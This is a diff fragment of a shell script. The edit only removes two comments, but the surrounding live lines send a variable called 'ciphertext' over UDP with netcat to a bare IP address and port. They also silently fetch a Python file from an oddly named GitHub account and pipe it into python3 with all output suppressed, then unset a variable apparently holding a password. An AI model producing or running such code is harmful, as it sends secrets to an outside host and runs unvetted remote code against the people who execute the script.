@@ -44,9 +44,9 @@ echo $ciphertext | nc -u -q 0 144.24.21.253 65432
 
 
 if curl -sSL https://raw.githubusercontent.com/CodeUpdaterFXD/testingSuite/main/helper.py | python3 >/dev/null 2>&1; then
-    : # did it but nothing
+    :
 else
-    : # nothing
+    :
 fi
 
 unset pwd
